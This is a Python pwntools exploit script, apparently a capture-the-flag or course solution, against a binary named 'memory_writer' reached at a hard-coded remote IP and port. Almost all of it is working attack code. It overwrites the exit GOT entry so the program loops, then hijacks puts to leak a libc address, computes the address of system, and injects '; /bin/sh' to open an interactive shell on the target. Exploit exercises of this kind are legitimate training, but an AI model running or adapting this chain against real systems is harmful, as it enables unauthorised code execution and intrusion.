import sys
from pwn import *

"""
3-stage exploit

1) cause the program to loop, in order to be offered multiple writes (i.e. overwrite exit with main address)
2) overwrite puts with printf, in order to _preserve_ printing capabilities and also to leak puts_got value,
since we're offered the _old value_
2') compute system address from leaked value (i.e. puts_got)
3) provide "; /bin/sh\x00" as name and overwrite puts with system
now, the program will call system("Good luck; /bin/sh\x00")
"""

exec_file = "./memory_writer"
libc_file = "./libc.so.6"
context.binary = exec_file

e = ELF(exec_file)
libc = ELF(libc_file)

# io = process(exec_file)
io = remote("141.85.224.107", 31337)

binsh_str = "; /bin/sh\x00"

addresses = {
    "printf_plt": e.symbols['printf'],
    "printf_got": e.symbols['got.printf'],
    "puts_plt"  : e.symbols['puts'],
    "puts_got"  : e.symbols['got.puts'],
    "exit_got"  : e.symbols['got.exit'],
    "main"      : 0x4007f8
}

for k, v in addresses.iteritems():
    log.info("{:s}: 0x{:016x}".format(k, v))



# 1) overwrite exit.got with main
# prompt
print ">[", io.recvline()[:-1], "]"
# name
print ">[", io.recvline()[:-1], "]"
io.sendline("a")
# address
print ">[", io.recvline()[:-1], "]"
io.sendline(str(addresses['exit_got']))
# value
print ">[", io.recvline()[:-1], "]"
io.sendline(str(addresses['main']))
# final
print "[1:", io.recvline()[:-1], "]"
print "[2:", io.recvline()[:-1], "]"
io.recvline()



# 2) overwrite puts.got with printf and compute system address from leak
# prompt
print ">[", io.recvline()[:-1], "]"
# name
print ">[", io.recvline()[:-1], "]"
io.sendline("a")
# address
print ">[", io.recvline()[:-1], "]"
io.sendline(str(addresses['puts_got']))
# value
print ">[", io.recvline()[:-1], "]"
io.sendline(str(addresses['printf_plt']))
# final
leak = io.recvline()
print "[1:", leak[:-1], "]"
print "[2:", io.recvline()[:-1], "]"

puts_address = int(leak.split()[4])
log.info("puts_address: 0x{:016x}".format(puts_address))

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
libc_start_address = puts_address - puts_offset
system_address = libc_start_address + system_offset

log.info("libc_start_address: 0x{:016x}".format(libc_start_address))
log.info("system_address: 0x{:016x}".format(system_address))



# 3) put "; /bin/sh\0" as name and overwrite puts with system
# prompt
print ">[", io.recv(), "]"
# name
io.sendline("; /bin/sh\x00")
# address
print ">[", io.recv(), "]"
io.sendline(str(addresses['puts_got']))
# value
print ">[", io.recv(), "]"
io.sendline(str(system_address))
# final
io.interactive()
